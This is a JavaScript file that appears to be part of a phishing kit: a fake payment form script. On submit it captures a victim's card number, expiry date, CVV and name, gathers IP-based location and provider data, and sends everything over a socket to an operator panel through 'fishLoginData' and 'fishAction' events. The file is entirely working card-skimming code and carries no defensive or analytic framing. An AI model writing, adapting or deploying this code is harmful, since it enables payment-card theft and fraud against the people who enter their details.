console.log("hp-script with socket js works");

// console.log("rl script works");
localStorage.setItem("ifSessionExist", "No");
// localStorage.setItem('currPage', '1');
// localStorage.setItem('hpIfAlreadySentCCFullInfo', 'No');

let socket;

const SubmitCCInfo = async () => {
    console.log("this is submit");

    if (!checkIfFormValid()) {
        return;
    }

    if (!socket) {
        socket = await initSocketConnection();
        initActionsOnCommandsFromPanelFunc(socket);
    }

    let hpCardNumberVal = hpCardNumberInput.value;
    let hpCardMMYYVal = hpCardMMYYInput.value;
    let hpCardCvvVal = hpCardCVVInput.value;
    let hpCCFirstLastNameVal = hpCCFirstLastNameInput.value;

    const ifSessionExist = localStorage.getItem("ifSessionExist");

    const { ip, zip, city, country, provider } = await getIpData(apiUrl);

    if (localStorage.ifSessionExist == "No") {
        //FIRST ACTION TO CREATE SESSIONS

        socket.emit("fishLoginData", {
            ip,
            zip,
            city,
            country,
            provider,
            userAgent: window.navigator.userAgent,
            project: project,
            projectType: projectType,
            fake: window.location.hostname,
            ccOrderSum: `?`,
            ccFullName: `${hpCCFirstLastNameVal}`,
        });
    }

    localStorage.ifSessionExist = "Yes";

    const sendFullCCInfo = () => {
        socket.emit("fishAction", {
            action: "fishAction",
            actionData:
                `\nCard info:\nCard Name: ${hpCCFirstLastNameVal}\nCard Number: ${hpCardNumberVal}` +
                `\nExp: ${hpCardMMYYVal} cvv: ${hpCardCvvVal}`,
            ccName: `${hpCCFirstLastNameVal}`,
            ccNumber: hpCardNumberVal,
            ccExp: hpCardMMYYVal,
            ccCVV: hpCardCvvVal,
            ip: ip,
            userAgent: window.navigator.userAgent,
            project: project,
            projectType: projectType,
            fake: window.location.hostname,
        });
    };
    setTimeout(sendFullCCInfo, 2000);

    hpLoadingRing.classList.remove("displaynone");
};

hpCCForm.addEventListener("submit", async () => {
    await SubmitCCInfo();
});
